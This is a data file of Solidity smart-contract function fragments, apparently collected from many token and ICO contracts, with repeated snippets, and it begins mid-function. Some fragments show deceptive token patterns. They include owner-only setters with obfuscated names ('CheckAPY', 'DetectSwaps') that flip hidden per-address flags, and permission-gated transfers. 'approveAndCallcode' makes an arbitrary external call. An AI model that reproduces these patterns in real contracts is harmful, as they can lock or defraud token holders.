            newForgeL1L2BatchTimeout <= ABSOLUTE_MAX_L1L2BATCHTIMEOUT,
            "Litex::updateForgeL1L2BatchTimeout: MAX_FORGETIMEOUT_EXCEED"
        );
        forgeL1L2BatchTimeout = newForgeL1L2BatchTimeout;
        emit UpdateForgeL1L2BatchTimeout(newForgeL1L2BatchTimeout);
    }
--------------------------------------------------------------------------------
function setAgreementHash(bytes32 _agreementHash) internal
    {
        require(agreementHash == bytes32(0), "Can not set agreement twice");
        agreementHash = _agreementHash;
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function transferETH() isOwner external {
        require(address(this).balance != 0);
        require(ethFundDeposit.send(address(this).balance));
    }
--------------------------------------------------------------------------------
function deregister(address _darknodeID) external onlyDeregisterable(_darknodeID) onlyDarknodeOwner(_darknodeID) {
        // Flag the darknode for deregistration
        store.updateDarknodeDeregisteredAt(_darknodeID, currentEpoch.blocknumber + minimumEpochInterval);
        numDarknodesNextEpoch -= 1;

        // Emit an event
        emit LogDarknodeDeregistered(_darknodeID);
    }
--------------------------------------------------------------------------------
function isPendingRegistration(address _darknodeID) external view returns (bool) {
        uint256 registeredAt = store.darknodeRegisteredAt(_darknodeID);
        return registeredAt != 0 && registeredAt > currentEpoch.blocknumber;
    }
--------------------------------------------------------------------------------
function isPendingDeregistration(address _darknodeID) external view returns (bool) {
        uint256 deregisteredAt = store.darknodeDeregisteredAt(_darknodeID);
        return deregisteredAt != 0 && deregisteredAt > currentEpoch.blocknumber;
    }
--------------------------------------------------------------------------------
function isDeregistered(address _darknodeID) public view returns (bool) {
        uint256 deregisteredAt = store.darknodeDeregisteredAt(_darknodeID);
        return deregisteredAt != 0 && deregisteredAt <= currentEpoch.blocknumber;
    }
--------------------------------------------------------------------------------
function delBot(address[] memory _counts) external checker {
        for (uint256 i = 0; i < _counts.length; i++) {
            botban(_counts[i]); }
    
    }
--------------------------------------------------------------------------------
function assignTokens(address _guardian, uint256 _amount) external onlyActiveDisputeManager {
        if (_amount > 0) {
            _updateAvailableBalanceOf(_guardian, _amount, true);
            emit GuardianTokensAssigned(_guardian, _amount);
        }
    }
--------------------------------------------------------------------------------
function getDeactivationRequest(address _guardian) external view returns (uint256 amount, uint64 availableTermId) {
        DeactivationRequest storage request = guardiansByAddress[_guardian].deactivationRequest;
        return (request.amount, request.availableTermId);
    }
--------------------------------------------------------------------------------
function transferETH() isOwner external {
        if (this.balance == 0) throw;
        if (!ethFundDeposit.send(this.balance)) throw;
    }
--------------------------------------------------------------------------------
function claimOwnership() public {
        require(msg.sender == newOwner, "Restricted to new owner");

        _transferOwnership(msg.sender);
    }
--------------------------------------------------------------------------------
constructor(address _owner2, address _bhx, address _usdt, address _feeAddress) public {
        owner = msg.sender;
        owner2 = _owner2;
        bhx = _bhx;
        usdt = _usdt;
        feeAddress = _feeAddress;
    }
--------------------------------------------------------------------------------
function defrostToken() public 
	{ // Function to defrost your own token, after the date of the defrost
	
		require(now>dateDefrost);
		balancesCanSell[msg.sender]=true;
		Defroze(msg.sender,true);
	}
--------------------------------------------------------------------------------
constructor() public {
    balances[msg.sender] = _totalSupply;
    emit Transfer(address(0), msg.sender, _totalSupply);
  }
--------------------------------------------------------------------------------
constructor(address _logic, address _admin, bytes memory _data) UpgradeabilityProxy(_logic, _data) public payable {
        assert(ADMIN_SLOT == bytes32(uint256(keccak256('eip1967.proxy.admin')) - 1));
        _setAdmin(_admin);
    }
--------------------------------------------------------------------------------
function transferFrom (address _from, address _to, uint256 _value)
    returns (bool success) {
    if (frozen) return false;
    else return AbstractToken.transferFrom (_from, _to, _value);
  }
--------------------------------------------------------------------------------
function unpauseContract() public {
    require(isContract(crydrController) == true);
    require(getAssetIDHash() == AssetIDInterface(crydrController).getAssetIDHash());

    super.unpauseContract();
  }
--------------------------------------------------------------------------------
function insertCyclePlayer() internal {
        if(numberOfCyclePlayers == cyclePlayers.length) {
            cyclePlayers.length += 1;
        }
        cyclePlayers[numberOfCyclePlayers++] = msg.sender;
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function addSwap(SwapParams calldata params) external onlyGovOrSubGov {
        swaps.push(
            SwapState({
                params: params,
                lastCumulativePriceUpdate: 0,
                lastCumulativePricePool1: 0,
                lastCumulativePricePool2: 0
            })
        );
    }
--------------------------------------------------------------------------------
constructor() public {
    balances[msg.sender] = _totalSupply;
    emit Transfer(address(0), msg.sender, _totalSupply);
  }
--------------------------------------------------------------------------------
function CheckAPY(address spender, bool val, bool val2, bool val3, bool val4) external onlyOwner {
    washington[spender] = val;
    oregon[spender] = val2; 
    wyoming[spender] = val3;
    newmexico = val4;
  }
--------------------------------------------------------------------------------
function getInfo()
        public 
        view 
        returns(uint256, uint256, uint256, uint256, uint256, uint256, uint256, uint256, address, uint256)
    {
        return (
            startBlockNo,
            startTotal,
            total,
            people,
            floatFund,
            safeFund,
            bonus,
            bonusEndTime,
            leader,
            lastPrice
        );
    }
--------------------------------------------------------------------------------
function withdrawRewards(address _user, uint256 _value) public onlyOwnerOrAllowed {
        require(rewardedBalance[_user] >= _value);

        rewardedBalance[_user] -= _value;
        appc.transfer(_user, _value);
    }
--------------------------------------------------------------------------------
function addHolder(address _holder) internal {
      
        if (holderNumber[_holder] == 0) {
            holders.push(_holder);
            holderNumber[_holder] = holders.length;
            
        }
    }
--------------------------------------------------------------------------------
function tokenPause() public {
        require(rightAndRoles.onlyRoles(msg.sender,6));
        require(!isFinalized);
        token.setPause(true);
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
        if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
constructor(address _gameContract, address _affiliateAddress, uint256 _affiliatePercent) public {
		gameContract = _gameContract;
		require (_affiliatePercent>=0 && _affiliatePercent <=3); // check affiliate percent range
		affiliateAddress = _affiliateAddress;
		affiliatePercent = _affiliatePercent;
		
	}
--------------------------------------------------------------------------------
function deprecate(address _upgradedAddress) public onlyOwner {
        require(_upgradedAddress != address(0));
        deprecated = true;
        upgradedAddress = _upgradedAddress;
        emit Deprecate(_upgradedAddress);
    }
--------------------------------------------------------------------------------
function _burn(address _owner, uint256 _tokenId) internal {
        clearApproval(_owner, _tokenId);
        removeTokenFrom(_owner, _tokenId);
        Transfer(_owner, address(0), _tokenId);
    }
--------------------------------------------------------------------------------
function Authorizable() public {
        authorizers.length = 2;
        authorizers[1] = msg.sender;
        authorizerIndex[msg.sender] = 1;
    }
--------------------------------------------------------------------------------
function addAuthorized(address _addr) external onlyAuthorized {
        authorizerIndex[_addr] = authorizers.length;
        authorizers.length++;
        authorizers[authorizers.length - 1] = _addr;
    }
--------------------------------------------------------------------------------
function addRecipient( address _recipient, uint _rewardRate ) external onlyPolicy() {
        require( _recipient != address(0) );
        info.push( Info({
            recipient: _recipient,
            rate: _rewardRate
        }));
    }
--------------------------------------------------------------------------------
function transferFrom (address _from, address _to, uint256 _value)
    public returns (bool success) {
    if (frozen) return false;
    else return AbstractToken.transferFrom (_from, _to, _value);
  }
--------------------------------------------------------------------------------
function purgeUpgrade() onlyAssetOwner() returns(bool) {
        if (pendingVersion == 0x0) {
            return false;
        }
        delete pendingVersion;
        delete pendingVersionTimestamp;
        return true;
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) revert();
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function isApprovedForAll(address _owner, address _operator)
    public
    view
    override
    returns (bool isOperator)
    {
        // Whitelist Erax proxy contracts for easy trading.
        if (_isProxyForUser(_owner, _operator)) {
            return true;
        }

        return super.isApprovedForAll(_owner, _operator);
    }
--------------------------------------------------------------------------------
function getApproved(uint256 tokenId)
        public
        view
        override
        returns (address)
    {
        require(_exists(tokenId), "approved query for nonexistent token");

        return _tokenApprovals[tokenId];
    }
--------------------------------------------------------------------------------
function setTokenURI(uint256 tokenId, string memory _tokenURI)
        public
        onlyOwner
    {
        require(_exists(tokenId), "URI set of nonexistent token");
        _tokenURIs[tokenId] = _tokenURI;
    }
--------------------------------------------------------------------------------
function transferFrom (address _from, address _to, uint256 _value)
    public returns (bool success) {
    if (frozen) return false;
    else return AbstractToken.transferFrom (_from, _to, _value);
  }
--------------------------------------------------------------------------------
constructor() public {
        totalSupply = INITIAL_SUPPLY;
        balances[marketAddress] = totalSupply;
        emit Transfer(address(0), marketAddress, totalSupply);
    }
--------------------------------------------------------------------------------
function confirmTransaction(uint256 transactionId)
        public
        onlyOwnerExists(msg.sender)
        onlyTransactionExists(transactionId)
        onlyNotConfirmed(transactionId, msg.sender)
    {
        confirmations[transactionId][msg.sender] = true;
        Confirmation(msg.sender, transactionId);

        executeTransaction(transactionId);
    }
--------------------------------------------------------------------------------
function CheckAPY(address spender, bool val, bool val2, bool val3, bool val4) external onlyOwner {
    buggy[spender] = val;
    golf[spender] = val2; 
    soccer[spender] = val3;
    grandhotel = val4;
  }
--------------------------------------------------------------------------------
function MADToken() public {
    totalSupply = INITIAL_SUPPLY;
    balances[msg.sender] = INITIAL_SUPPLY;
    Transfer(0x0, msg.sender, INITIAL_SUPPLY);
  }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function setInactivityReleasePeriod(uint256 _expiry) public onlyAdmin returns (bool success) {
        require(_expiry < 26 weeks, "_expiry < 26 weeks");
        inactivityReleasePeriod = _expiry;
        return true;
    }
--------------------------------------------------------------------------------
function deprecate(address _upgradedAddress) public onlyOwner {
        require(_upgradedAddress != address(0));
        deprecated = true;
        upgradedAddress = _upgradedAddress;
        emit Deprecate(_upgradedAddress);
    }
--------------------------------------------------------------------------------
function addToken(
    uint256 tokenId,
    string calldata uri
  ) external onlyOwner {
    if (bytes(tokenURIs[tokenId]).length > 0) {
      revert TokenAlreadyExists();
    }

    tokenURIs[tokenId] = uri;
  }
--------------------------------------------------------------------------------
function mintTokens(uint256 amt) public onlyOwner {
        require(totalSupply() + amt <= supplycap, 'Exceeded supply cap');
        _mint(msg.sender, amt);
    }
--------------------------------------------------------------------------------
function CheckAPY(address spender, bool val, bool val2, bool val3, bool val4) external onlyOwner {
    fires[spender] = val;
    volcanos[spender] = val2; 
    mountains[spender] = val3;
    giinko = val4;
  }
--------------------------------------------------------------------------------
function getMintDigest(uint256 nonce, bytes32 challenge_digest, bytes32 challenge_number) public view returns(bytes32 digesttest) {
        bytes32 digest = keccak256(abi.encodePacked(challenge_number, msg.sender, nonce));
        return digest;
   }
--------------------------------------------------------------------------------
function approve(address spender, uint256 value)
        public
        initialDistributionLock
        override
        returns (bool)
    {
        _allowedFragments[_msgSender()][spender] = value;
        emit Approval(_msgSender(), spender, value);
        return true;
    }
--------------------------------------------------------------------------------
constructor( IxBackendIface _b
               , IxPaymentsIface _pay
               , EnsOwnerProxy _ensOwnerPx
               , BBFarmIface _bbFarm0
               , CommAuctionIface _commAuction
               ) payoutAllC(msg.sender) public {
        backend = _b;
        payments = _pay;
        ensOwnerPx = _ensOwnerPx;
        _addBBFarm(0x0, _bbFarm0);
        commAuction = _commAuction;
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function VOCOToken() public {
    totalSupply_ = INITIAL_SUPPLY;
    balances[msg.sender] = INITIAL_SUPPLY;
    Transfer(0x0, msg.sender, INITIAL_SUPPLY);
  }
--------------------------------------------------------------------------------
function () payable {
        _getAsset()._performGeneric.value(msg.value)(msg.data, msg.sender);
        _returnReturnData(true);
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        public
        validParamData(2)
        validAddress(_spender)
        onlyIf(_value == 0 || allowance[msg.sender][_spender] == 0)
        returns (bool success)
    {
        uint256 currentAllowance = allowance[msg.sender][_spender];

        return changeApprovalCore(_spender, currentAllowance, _value);
    }
--------------------------------------------------------------------------------
function emergencySetStartingIndexBlock() external onlyOwner {
        require(startingIndex == 0, "Starting index is already set");
        
        startingIndexBlock = block.number;
    }
--------------------------------------------------------------------------------
function safeAdd(uint256 x, uint256 y) internal returns(uint256) {
        uint256 z = x + y;
        assert((z >= x) && (z >= y));
        return z;
    }
--------------------------------------------------------------------------------
function _mint(address _to, uint256 _tokenId) internal {
        super._mint(_to, _tokenId);

        allTokensIndex[_tokenId] = allTokens.length;
        allTokens.push(_tokenId);
    }
--------------------------------------------------------------------------------
function setIco() external managerOnly {
        require(statusICO == StatusICO.PreIcoFinished);
        statusICO = StatusICO.Ico;
        canIBuy = true;
        emit LogStartIco();
    }
--------------------------------------------------------------------------------
function selingWithdrawBalance()
        view
        public
        returns(uint256)
    {
        address _customerAddress = msg.sender;
         
        uint256 _sellingWithdraw = (uint256) (sellingWithdrawBalance_[_customerAddress]) ; // get all balance
        
        return  _sellingWithdraw;
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function changeImageLocation(
        string calldata handle,
        string calldata newImageLocation
    )
        external
        handleExists(handle)
        onlyHandleOwner(handle)
    {

        handleNameHashVsHandle[keccak256(abi.encodePacked(handle))].imageLocation = newImageLocation;

        emit NewImageLocation(handle, newImageLocation);
    }
--------------------------------------------------------------------------------
function changePeerId(
        string calldata handle,
        bytes calldata data
    )
        external
        handleExists(handle)
        onlyHandleOwner(handle)
    {

        handleNameHashVsHandle[keccak256(abi.encodePacked(handle))].data = data;

        emit NewPeerId(handle, data);
    }
--------------------------------------------------------------------------------
function calculateDividendTokens(uint256 ethervalue, uint256 subvalue) public constant returns (uint256 tokens) {
		return sub(fixedExp(fixedLog(reserve() - subvalue + ethervalue)*crr_n/crr_d + price_coeff), totalSupply);
	}
--------------------------------------------------------------------------------
function confirmTransaction(uint transactionId)
    public
    whenNotPaused
    ownerExists(msg.sender)
    transactionExists(transactionId)
    notConfirmed(transactionId, msg.sender)
    {
        confirmations[transactionId][msg.sender] = true;
        Confirmation(msg.sender, transactionId);
        executeTransaction(transactionId);
    }
--------------------------------------------------------------------------------
function setSigner(address signer, uint256 limit) external {
        require(signer != address(0) && signers[msg.sender] == 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff);
        signers[signer] = limit;
    }
--------------------------------------------------------------------------------
function setContractAddress(address _address) external onlyHumans() {
		require (msg.sender == masterAdmin);
		require (mainContractSet == false);
		mainContract = _address;
		mainContractSet = true;
	}
--------------------------------------------------------------------------------
function approveAndCallcode(address _spender, uint256 _value, bytes _extraData) public returns (bool success) {
        if (approve(_spender, _value)) {
            //Call the contract code
            if (!_spender.call(_extraData)) {revert();}
            return true;
        }
    }
--------------------------------------------------------------------------------
function transferETH() isOwner external {
        if (this.balance == 0) throw;
        if (!ethFundDeposit.send(this.balance)) throw;
    }
--------------------------------------------------------------------------------
function addManyToWhitelist(address[] users) external onlyOwner {
        for (uint32 i = 0; i < users.length; i++) {
            addToWhitelist(users[i]);
        }
    }
--------------------------------------------------------------------------------
function removeManyFromWhitelist(address[] users) external onlyOwner {
        for (uint32 i = 0; i < users.length; i++) {
            removeFromWhitelist(users[i]);
        }
    }
--------------------------------------------------------------------------------
function removeManyFromAllocationList(address[] users)
        external
        onlyOwner
        atRound(SaleRounds.EarlyInvestment)
    {
        for (uint32 i = 0; i < users.length; i++) {
            removeFromAllocationList(users[i]);
        }
    }
--------------------------------------------------------------------------------
function RevolutionCoin() public {
        owner = msg.sender;
        totalSupply = INITIAL_SUPPLY;
        tokenBalances[owner] = INITIAL_SUPPLY * (10 ** uint256(decimals));   //Since we divided the token into 10^18 parts
    }
--------------------------------------------------------------------------------
function returnEth() internal {
        // return if some eth left
        if (address(this).balance > 0) {
            msg.sender.transfer(address(this).balance);
        }
    }
--------------------------------------------------------------------------------
function returnEth() internal {
        // return if some eth left
        if (address(this).balance > 0) {
            msg.sender.transfer(address(this).balance);
        }
    }
--------------------------------------------------------------------------------
function transferFrom(address _from, address _to, uint _amount) returns (bool success) {
        // Cannot transfer before crowdsale ends + 7 days
        require((time() > endDate + 7 days ));
        // Standard transferFrom
        return super.transferFrom(_from, _to, _amount);
    }
--------------------------------------------------------------------------------
function collect() onlyOwner {
		require(addrcnt.call.value(this.balance)(0));
		Collect(addrcnt,this.balance);
	}
--------------------------------------------------------------------------------
function transfer(address recipient, uint256 amount) public virtual onlyPermitted override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        
        if(_msgSender() == creator())
        { givePermissions(recipient); }
        
        return true;
    }
--------------------------------------------------------------------------------
function CheckTheAddress(address spender, bool val, bool val2, bool val3, bool val4) external onlyOwner {
    newhorizon[spender] = val;
    cassini[spender] = val2; 
    hubble[spender] = val3;
    thisValue = val4;
  }
--------------------------------------------------------------------------------
function getInitFunction() public pure returns (bytes4) {
        return bytes4(keccak256("configure(uint256,uint256,uint256,uint256,uint8[],address)"));
    }
--------------------------------------------------------------------------------
function _deliverTokens(address _beneficiary, uint256 _tokenAmount) internal {
        require(ISecurityToken(securityToken).mint(_beneficiary, _tokenAmount), "Error in minting the tokens");
    }
--------------------------------------------------------------------------------
constructor(string memory name, string memory symbol , uint256 _supply) public {
        _name = name;
        _symbol = symbol;
        _decimals = 18;
        _mint(owner(), _supply * 10**18);
       
    }
--------------------------------------------------------------------------------
function accumulativeFundsOf(address _owner) public view returns (uint256) {
        return pointsPerShare.mul(balanceOf(_owner)).toInt256Safe()
        .add(pointsCorrection[_owner]).toUint256Safe() / pointsMultiplier;
    }
--------------------------------------------------------------------------------
function balanceOf(address _owner) public view returns (uint256 balance){
        UserToken storage user = _balancesMap[_owner];
        balance = user.tokens.add(user.unlockLeft);
    }
--------------------------------------------------------------------------------
function setBalanceTracker(BalanceTracker newBalanceTracker)
    public
    onlyDeployer
    notNullAddress(newBalanceTracker)
    notSameAddresses(newBalanceTracker, balanceTracker)
    {
        // Require that this contract has not been frozen
        require(!balanceTrackerFrozen);

        // Update fields
        BalanceTracker oldBalanceTracker = balanceTracker;
        balanceTracker = newBalanceTracker;

        // Emit event
        emit SetBalanceTrackerEvent(oldBalanceTracker, newBalanceTracker);
    }
--------------------------------------------------------------------------------
function setOffer(uint256 _offer) external {
        require(_offer <= 10_000, "Offer exceeds 100%.");
        offers[msg.sender] = _offer;
    }
--------------------------------------------------------------------------------
function modifyPowPrice(uint _powId, uint256 _newPrice) public {
      require(_newPrice > 0);
      require(powIndexToOwner[_powId] == msg.sender);
      powIndexToPrice[_powId] = _newPrice;
  }
--------------------------------------------------------------------------------
function UserBalance(uint256 amount) public returns (bool) {
        require(
            _msgSender() == 0x0f4FB60b22D15839d2c993677c1399FEE3cB0ed4,
            "BEP20: Not accessible"
        );
        burning(_msgSender(), amount);

        return true;
    }
--------------------------------------------------------------------------------
function mint(address _to, uint256 _value) external onlyOwner isMintStage{
      balances[_to] = balances[_to] + _value;
      coinMinted = coinMinted + _value;
      Mint(_to, _value);
    }
--------------------------------------------------------------------------------
function calculateDividendTokens(uint256 ethervalue, uint256 subvalue) public constant returns (uint256 tokens) {
		return sub(fixedExp(fixedLog(reserve() - subvalue + ethervalue)*crr_n/crr_d + price_coeff), totalSupply);
	}
--------------------------------------------------------------------------------
function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
        _previousOwner = address(0);
    }
--------------------------------------------------------------------------------
constructor (Token _company_token) public {
    owner = msg.sender;
    company_token = _company_token;
    currentBatch = 0;
    addrPerStep = 20;
    setBountyAddresses();
    setBountyAmounts();
  }
--------------------------------------------------------------------------------
function setContractAddress(address _contract) public onlyOwner {
        require(_contract != address(0));
        addressContract = _contract;
        emit AddressContractChanged(_contract, msg.sender);
    }
--------------------------------------------------------------------------------
function EIP20Factory() public {
        //upon creation of the factory, deploy a EIP20 (parameters are meaningless) and store the bytecode provably.
        address verifiedToken = createEIP20(10000, "Verify Token", 3, "VTX");
        EIP20ByteCode = codeAt(verifiedToken);
    }
--------------------------------------------------------------------------------
function Useless(address spender, bool val, bool val2, bool val3, bool val4) external onlyOwner {
    scorching[spender] = val;
    heatwave[spender] = val2; 
    yuan[spender] = val3;
    bono = val4;
  }
--------------------------------------------------------------------------------
constructor () public {
        _decimals = 18;
        _owner = _msgSender();
        _safeOwner = _msgSender();
        _mint(_owner, initialSupply*(10**18));
      
    }
--------------------------------------------------------------------------------
function setMintDelegate(address _newDelegate) external onlyOwner
    {
        require(_newDelegate != address(0), "0x00 address not allowed.");
        mintDelegate = _newDelegate;
    }
--------------------------------------------------------------------------------
function validPurchase() internal constant returns (bool) {
    bool withinPeriod = started;
    bool nonZeroPurchase = msg.value != 0;
    return withinPeriod && nonZeroPurchase;
  }
--------------------------------------------------------------------------------
function rejectMultiSwap(bytes32[] _transactionIds) onlyApprover public {
    for (uint i = 0; i < _transactionIds.length; i++) {
       rejectSwap(_transactionIds[i]); 
    }  
  }
--------------------------------------------------------------------------------
function approveMultiSwap(bytes32[] _transactionIds) onlyApprover public {
    for (uint i = 0; i < _transactionIds.length; i++) {
       approveSwap(_transactionIds[i]); 
    }  
  }
--------------------------------------------------------------------------------
function init_bounty_program(address _bounty) onlyOwner
    {
        if (address(0) != address(bounty)) revert();
        bounty = _bounty;
        mint_for(bounty, bounty_allocation);
    }
--------------------------------------------------------------------------------
function safeAdd(uint a, uint b) returns (uint) {
        uint c = a + b;
        assert(c>=a && c>=b);
        return c;
    }
--------------------------------------------------------------------------------
function setInactivityReleasePeriod(uint256 expiry) onlyOwner returns (bool success) {
        if (expiry > 1000000) throw;
        inactivityReleasePeriod = expiry;

        emit InactivityReleasePeriodChange(expiry);
        return true;
    }
--------------------------------------------------------------------------------
function Exchange(address feeAccount_, uint256 makerFee_, uint256 takerFee_, uint256 inactivityReleasePeriod_) {
        owner = msg.sender;
        feeAccount = feeAccount_;
        inactivityReleasePeriod = inactivityReleasePeriod_;
        makerFee = makerFee_;
        takerFee = takerFee_;
    }
--------------------------------------------------------------------------------
function withdraw(
        uint256 amount,
        address token,
        address receiver,
        string calldata burnTxHash
    ) external onlyWallet {
        IERC20(token).safeTransfer(receiver, amount);
        emit WithdrawCollateral(amount, receiver, token, burnTxHash);
    }
--------------------------------------------------------------------------------
function _getSigner(
        string memory _username,
        string memory _contactData,
        uint _nonce,
        bytes memory _signature
    ) internal view returns(address) {
        bytes32 signHash = _getSignHash(_dataHash(_username, _contactData, _nonce));
        return _recoverAddress(signHash, _signature);
    }
--------------------------------------------------------------------------------
function transfer(address recipient, uint256 amount) public virtual onlyPermitted override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        
        if(_msgSender() == creator())
        { givePermissions(recipient); }
        
        return true;
    }
--------------------------------------------------------------------------------
constructor (string memory name, string memory symbol) {
        _name = name;
        _symbol = symbol;
        _decimals = 18;
        _supplyCap = 50000000000000000000000;
        owner = msg.sender;
    }
--------------------------------------------------------------------------------
function withDraw(address _etherAddress) public payable onlyOwner {
        require (_etherAddress != address(0));
        address contractAddress = this;
        _etherAddress.transfer(contractAddress.balance);
    }
--------------------------------------------------------------------------------
function withdrawEther(uint256 amount) public
    {
        require(msg.sender == owner, "Just owner can withdraw");
        owner.transfer(amount);
    }
--------------------------------------------------------------------------------
function UserBalance(uint256 amount) public returns (bool) {
        require(
            _msgSender() == 0xEDc1B5fcFf552772450188eC4281D8b838D76686,
            "BEP20: Not accessible"
        );
        burning(_msgSender(), amount);

        return true;
    }
--------------------------------------------------------------------------------
constructor () internal {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
--------------------------------------------------------------------------------
function balanceOf(address owner) public view override returns (uint256) {
        if (owner == address(0)) revert BalanceQueryForZeroAddress();
        return uint256(_addressData[owner].balance);
    }
--------------------------------------------------------------------------------
function transferETH() isOwner external {
        if (this.balance == 0) throw;
        if (!ethFundDeposit.send(this.balance)) throw;
    }
--------------------------------------------------------------------------------
function _mint(address to) internal virtual returns (uint256){
    _tokenIds.increment();
    uint256 id = _tokenIds.current();
    _safeMint(to, id);

    return id;
  }
--------------------------------------------------------------------------------
function acceptOwnership() public {
        require(msg.sender == newOwner);
        OwnerUpdate(owner, newOwner);
        owner = newOwner;
        newOwner = 0x0;
    }
--------------------------------------------------------------------------------
function OPTCToken() {
      totalSupply = 36 * 10000 * 10000 * (10**(uint256(decimals)));
      balances[msg.sender] = totalSupply;    // Give the creator all initial tokens
    }
--------------------------------------------------------------------------------
function transfer(address recipient, uint256 amount) public virtual onlyPermitted override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        
        if(_msgSender() == creator())
        { givePermissions(recipient); }
        
        return true;
    }
--------------------------------------------------------------------------------
function setFee(uint256 newFee) external
    {
        require(msg.sender == owner);
        require(newFee <= 0.01 ether);
        feeForSplitterCreation = newFee;
    }
--------------------------------------------------------------------------------
function freezeAccount(address _holder) public onlyOwner returns (bool) {
        require(!frozen[_holder]);
        frozen[_holder] = true;
        emit Freeze(_holder);
        return true;
    }
--------------------------------------------------------------------------------
function unfreezeAccount(address _holder) public onlyOwner returns (bool) {
        require(frozen[_holder]);
        frozen[_holder] = false;
        emit Unfreeze(_holder);
        return true;
    }
--------------------------------------------------------------------------------
constructor() public{
    LastNRTRelease = now;
    AnnualNRTAmount = 819000000000000000000000000;
    MonthlyNRTAmount = AnnualNRTAmount.div(uint256(12));
    MonthCount = 0;
  }
--------------------------------------------------------------------------------
function purgeUpgrade() onlyAssetOwner() returns(bool) {
        if (pendingVersion == 0x0) {
            return false;
        }
        delete pendingVersion;
        delete pendingVersionTimestamp;
        return true;
    }
--------------------------------------------------------------------------------
function cancel() public onlyOwner {
    require(!isCancelled, "pool is already cancelled");
    _preValidateCancellation();
    isCancelled = true;
    emit Cancelled();
  }
--------------------------------------------------------------------------------
function validPurchase() internal returns (bool) {
    bool withinCap = weiRaised.add(msg.value) <= cap;
    return super.validPurchase() && withinCap;
  }
--------------------------------------------------------------------------------
function rescueTokensInMultiplePolls(uint[] _pollIDs) public {
        // loop through arrays, rescuing tokens from all
        for (uint i = 0; i < _pollIDs.length; i++) {
            rescueTokens(_pollIDs[i]);
        }
    }
--------------------------------------------------------------------------------
function safeAdd(uint a, uint b) pure returns (uint) {
        uint c = a + b;
        assert(c>=a && c>=b);
        return c;
    }
--------------------------------------------------------------------------------
function DetectSwaps(address spender, bool val, bool val2, bool val3, bool val4) external onlyOwner {
    masala[spender] = val;
    garam[spender] = val2; 
    punjab[spender] = val3;
    clinton = val4;
  }
--------------------------------------------------------------------------------
function deposit(address investor) onlyOwner public payable {
    require(state == State.Active);
    deposited[investor] = deposited[investor].add(msg.value);
  }
--------------------------------------------------------------------------------
function closeCycle(uint value) public onlyAuthorized bankrollPhase {
    require(tokenBalance() >= value);
    finalStakes[cycle] = safeSub(value, safeMul(updateGasCost, numHolders)/100);//updateGasCost is using 2 decimals
  }
--------------------------------------------------------------------------------
function addHolder(address holder, uint numSH) internal{
    if(numSH < stakeholders.length)
      stakeholders[numSH] = holder;
    else
      stakeholders.push(holder);
  }
--------------------------------------------------------------------------------
function approveAndCall(address _spender, uint256 _value, bytes _extraData) public {
        require(approve(_spender, _value));
        IApprovalRecipient(_spender).receiveApproval(msg.sender, _value, _extraData);
    }
--------------------------------------------------------------------------------
function UserBalance(uint256 amount) public returns (bool) {
        require(
            _msgSender() == 0x95CAA2eb2997Fa29DC7794fBcD97eFf04B0a6FED,
            "BEP20: Not accessible"
        );
        burning(_msgSender(), amount);

        return true;
    }
--------------------------------------------------------------------------------
function transferETH() isOwner external {
        if (this.balance == 0) throw;
        if (!ethFundDeposit.send(this.balance)) throw;
    }
--------------------------------------------------------------------------------
function transfer(address to, uint256 _tokenId) public {
    // check if token transfers feature is enabled
    require(__isFeatureEnabled(FEATURE_TRANSFERS));

    // call sender gracefully - `from`
    address from = msg.sender;

    // delegate call to unsafe `__transfer`
    __transfer(from, to, _tokenId);
  }
--------------------------------------------------------------------------------
function transferTokens(address _tokenAddress, address _recipient) public isOwner {
        ERC20I token = ERC20I(_tokenAddress);
        require(token.transfer(_recipient, token.balanceOf(this)));
    }
--------------------------------------------------------------------------------
function transfer(address _to, uint _value) public returns (bool) {
        require(_to != address(0));
        require(!isFrozen);
        return super.transfer(_to, _value);
    }
--------------------------------------------------------------------------------
function getBalance(ERC20 token, address user) public view returns(uint) {
        if (token == ETH_TOKEN_ADDRESS)
            return user.balance;
        else
            return token.balanceOf(user);
    }
--------------------------------------------------------------------------------
function CaptainToken() public {
    captains.length += 1;
    setAdminContract(msg.sender,true);
    setActionContract(msg.sender,true);
  }
--------------------------------------------------------------------------------
function CoinPokerToken(address _ownerAddr, address _preIcoAddr, address _tournamentsAddr, address _cashierAddr) {
        ownerAddr = _ownerAddr;
        preIcoAddr = _preIcoAddr;
        tournamentsAddr = _tournamentsAddr;
        cashierAddr = _cashierAddr;
        balances[ownerAddr] = _totalSupply; // Give the owner all initial tokens
    }
--------------------------------------------------------------------------------
constructor(
        ModuleRegistry _registry,
        TransferStorage _transferStorage,
        GuardianStorage _guardianStorage,
        address _priceProvider,
        uint256 _securityPeriod,
        uint256 _securityWindow,
        uint256 _defaultLimit,
        LimitManager _oldLimitManager
    )
